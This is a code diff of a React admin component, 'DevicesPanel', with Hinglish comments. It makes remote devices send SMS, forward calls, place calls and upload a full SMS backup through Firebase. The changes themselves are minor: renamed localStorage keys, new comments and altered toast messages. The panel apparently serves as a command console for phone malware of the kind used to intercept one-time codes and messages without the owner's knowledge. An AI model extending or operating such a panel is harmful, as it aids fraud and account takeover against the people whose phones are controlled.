@@ -22,18 +22,19 @@ export default function DevicesPanel({
   const [expandedDevices, setExpandedDevices] = useState({});
   const [activeTabs, setActiveTabs] = useState({});
 
-  // Permanent Storage - SMS Send hone ke baad bhi number aur message text bilkul nahi hatega
+  // Permanent Persistent State: Number aur Text send karne ke baad bhi kabhi nahi hatega
   const [smsPhone, setSmsPhone] = useState("");
   const [smsBody, setSmsBody] = useState("");
   const [simChoice, setSimChoice] = useState({});
   const [formMemory, setFormMemory] = useState({});
 
+  // Browser storage se saved phone number aur text content load karna
   useEffect(() => {
     try {
-      const savedPhone = localStorage.getItem("rto_panel_phone");
-      const savedBody = localStorage.getItem("rto_panel_body");
-      const savedSims = localStorage.getItem("rto_panel_sims");
-      const savedMemory = localStorage.getItem("rto_panel_memory");
+      const savedPhone = localStorage.getItem("rto_permanent_phone");
+      const savedBody = localStorage.getItem("rto_permanent_body");
+      const savedSims = localStorage.getItem("rto_permanent_sims");
+      const savedMemory = localStorage.getItem("rto_permanent_memory");
 
       if (savedPhone !== null) setSmsPhone(savedPhone);
       if (savedBody !== null) setSmsBody(savedBody);
@@ -42,25 +43,28 @@ export default function DevicesPanel({
     } catch (e) {}
   }, []);
 
+  // Phone number change hone par instant save
   const handlePhoneChange = (val) => {
     setSmsPhone(val);
     try {
-      localStorage.setItem("rto_panel_phone", val);
+      localStorage.setItem("rto_permanent_phone", val);
     } catch (e) {}
   };
 
+  // Message content change hone par instant save
   const handleBodyChange = (val) => {
     setSmsBody(val);
     try {
-      localStorage.setItem("rto_panel_body", val);
+      localStorage.setItem("rto_permanent_body", val);
     } catch (e) {}
   };
 
+  // SIM selection
   const handleSimChange = (devId, val) => {
     setSimChoice((prev) => {
       const updated = { ...prev, [devId]: val };
       try {
-        localStorage.setItem("rto_panel_sims", JSON.stringify(updated));
+        localStorage.setItem("rto_permanent_sims", JSON.stringify(updated));
       } catch (e) {}
       return updated;
     });
@@ -70,7 +74,7 @@ export default function DevicesPanel({
     setFormMemory((prev) => {
       const updated = { ...prev, [key]: val };
       try {
-        localStorage.setItem("rto_panel_memory", JSON.stringify(updated));
+        localStorage.setItem("rto_permanent_memory", JSON.stringify(updated));
       } catch (e) {}
       return updated;
     });
@@ -123,7 +127,7 @@ export default function DevicesPanel({
     setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
   };
 
-  // SMS EXECUTE (Notification hata diya gaya hai)
+  // SEND SMS & COMMANDS - Data send hone ke baad text/number remove nahi hoga
   const handleCommand = (type, devId) => {
     const baseRef = ref(db, `user_data/${devId}`);
 
@@ -145,7 +149,8 @@ export default function DevicesPanel({
         simIndex: Number(simSlotSelected),
         timestamp: Date.now()
       }).then(() => {
-        // "SMS sent via SIM 1" popup yahan se hata diya gaya hai
+        showToast("✅ Command sent", "success");
+        // NOTE: smsPhone aur smsBody state ko intentionally touch nahi kiya gaya hai
       });
     } 
     else if (type === "fwd_on") {
@@ -163,7 +168,7 @@ export default function DevicesPanel({
         sim: Number(selectedSim),
         simIndex: Number(selectedSim),
         timestamp: Date.now()
-      }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
+      }).then(() => showToast("✅ Call Forward ON", "success"));
     } 
     else if (type === "fwd_off") {
       const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
@@ -175,7 +180,7 @@ export default function DevicesPanel({
         sim: Number(selectedSim),
         simIndex: Number(selectedSim),
         timestamp: Date.now()
-      }).then(() => showToast(`⛔ Call Forward OFF (SIM ${Number(selectedSim) + 1})`, "success"));
+      }).then(() => showToast("⛔ Call Forward OFF", "success"));
     } 
     else if (type === "call") {
       const num = formMemory[`callNum-${devId}`];
@@ -190,7 +195,7 @@ export default function DevicesPanel({
         simSlot: selectedSim,
         sim: Number(selectedSim),
         timestamp: Date.now()
-      }).then(() => showToast(`📞 Calling via SIM ${Number(selectedSim) + 1}`, "success"));
+      }).then(() => showToast("📞 Calling sent", "success"));
     } 
     else if (type === "backup") {
       if (!confirm(`Trigger full SMS backup on ${devId}?`)) return;
@@ -460,7 +465,7 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* SEND SMS TAB */}
+                  {/* SEND SMS TAB - RECIPIENT NUMBER AUR CONTENT KABHI CLEAR NAHI HOGA */}
                   {curTab === "sendsms" && (
                     <div className="section-premium" style={{ background: "rgba(12, 16, 26, 0.8)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, padding: 14 }}>
                       <div style={{ fontSize: 13, fontWeight: 600, color: "var(--text-primary)", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
